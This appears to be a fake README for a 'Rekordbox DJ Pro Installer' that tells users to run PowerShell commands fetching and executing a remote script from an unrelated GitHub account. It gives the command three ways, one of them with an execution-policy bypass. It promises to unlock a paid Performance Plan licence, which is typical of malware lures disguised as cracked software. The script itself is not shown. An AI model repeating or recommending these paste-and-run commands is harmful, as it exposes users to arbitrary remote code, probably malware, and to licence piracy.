# Rekordbox DJ Pro Installer
One-click setup for Rekordbox DJ Pro Installer -- the professional DJ platform by Pioneer DJ for music management, live performance mixing, and CDJ venue preparation with streaming integration, beat grid analysis, and hardware controller sync

Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

## What It Does

- Installs Rekordbox with the Pioneer DJ hardware driver package for controller and CDJ device integration.
- Analyzes the music library and generates beat grids, key detection data, and waveforms for all tracks.
- Activates the Performance Plan license and enables all mixing, looping, pad performance, and effect modules.
- Opens Rekordbox in Performance mode with the connected controller mapped and the first track cued up.

## Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- Pioneer DJ controller or CDJ hardware recommended for full performance feature access
- ~1200 MB free disk space

## Troubleshooting

**Beat grid is misaligned on tracks with gradual tempo changes and manual correction drifts after a few bars**

Enable Dynamic Beat Grid in Preferences > Analysis and re-analyze the tracks to use adaptive grid tracking instead of fixed BPM.

**Streaming tracks from Beatport or SoundCloud show no waveform and cannot be loaded to the performance deck**

Confirm the streaming subscription is active and re-link the account in Preferences > Streaming Services to refresh the token.

**Bypass execution policy (alternative):**

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1)"
```

"irm is not recognized" -- use the expanded syntax on older PowerShell:

```powershell
Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1')
```

## License
MIT -- see LICENSE.